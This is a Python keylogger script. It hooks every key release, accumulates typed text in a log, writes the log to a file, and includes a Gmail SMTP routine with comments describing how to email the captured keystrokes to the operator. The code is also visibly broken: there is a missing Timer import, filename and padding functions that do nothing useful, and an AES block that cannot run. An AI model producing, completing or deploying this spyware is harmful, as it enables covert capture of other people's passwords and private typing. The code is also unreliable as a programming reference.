#! bin/python3/keylogger

import keyboard
import smtplib  # For sending email using SMTP protocol (gmail).
from datetime import datetime
from Crypto.Cipher import AES
import hashlib 

SEND_REPORT_EVERY = 60
"""
    (60 = 1min), change according to your preference
    or change according to time between reports 
"""
EMAIL_ADDRESS = 'exemple@notsafe.com'
EMAIL_PASSWORD = 'notsosafe'


class keylogger:
    def __init__(self, interval, report_method='email', start_dt_str=None, end_dt_str=None):
        # pass SEND_REPORT_EVERY to interval
        self.filename = f'keylog-{start_dt_str}_{end_dt_str}' # Error ()
        # string variable that contains the log of all Keystrokes within `self.interval`
        self.interval = interval  
        self.report_method = report_method
        self.log = ''
        # record start & end datetime
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()

    def callback(self, event):
        
        # This callback is invoked whenever a keyboard event is occurred

        name = event.name
        if len(name) > 1:
            if name == 'space':
                name = ' '
            elif name == 'enter':
                # add a new line whenever an ENTER is pressed
                name = '[ENTER]\n'
            elif name == 'decimal':
                name = '.'
            else:
                name = name.replace(' ', '_')
                name = f'[{name.upper()}]'

        self.log += name

    def update_filename(self):
        str(self.start_dt)[:-7].replace(' ', '-').replace(':', '')
        str(self.end_dt)[:-7].replace(' ', '-').replace(':', '')

    def report_to_file(self):
        """
        This method creates a log file in the current directory that contains
        the current keylogs in the `self.log` variable
        """

        # open the file in write mode (create it)
        with open(f'{self.filename}.txt', 'w') as f:
            # write the keylogs to the file
            print(self.log, file=f)
        print(f'[+] Saved {self.filename}.txt')

    @staticmethod
    def sendemail(email, password, message):
        # connection to the SMTP server
        server = smtplib.SMTP(host='smtp.gmail.com', port=587)
        # connect to the SMTP server as TLS mode ( for security )
        server.starttls()
        # login to the email account
        server.login(email, password)
        # message
        server.sendmail(email, email, message)
        # terminates the session
        server.quit()

    def report(self):
        """
            This function gets called every `self.interval`
            It basically sends keylogs and resets `self.log` variable
        """
        if self.log:
            # if there is something in the lof, report it
            self.end_dt = datetime.now()
            # update 'self.filename'
            self.update_filename()
            if self.report_method == 'file':
                self.report_to_file()
                """
                    if you want to print in the console, uncomment below the line
                    print(f'[{self.filename}] - {self.log}')
                """
                self.start_dt = datetime.now()
            self.log = ''
            timer = Timer(interval=self.interval, function=self.report)
            # set the thread as daemon (die when main thread die)
            timer.daemon = True
            # start the timer
            timer.start()

    def start(self):
        # record the start datetime
        self.start_dt = datetime.now()
        # start the keylogger
        keyboard.on_release(callback=self.callback)
        # start the report the keylogs
        self.report()
        # block the current thread, wait until CTRL+C is pressed
        keyboard.wait()

##### Enrypt ######

password = ''.encode()    
key = ''
mode = AES.MODE_CBC
IV = 'IV456'

def pad_message():
    while len(message)% 16 != 0:
        message = message + ' '
    return

cipher = AES.new(key, mode, IV)
message = ''
padded_message = pad_message(message)

encrypt = cipher.encrypt(padded_message)
print(encrypt)
# print(cipher.encrypt(padded_message))

if __name__ == '__main__':

    """
        if you want a keylogger to send files to you through email:
        keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="email")
        if you want a keylogger to record keylogs to a local file:
        keylogger = keylogger(interval=SEND_REPORT_EVERY, report_method="file")
    """
    keylogger = keylogger(interval=SEND_REPORT_EVERY, report_method='file')
    keylogger.start()
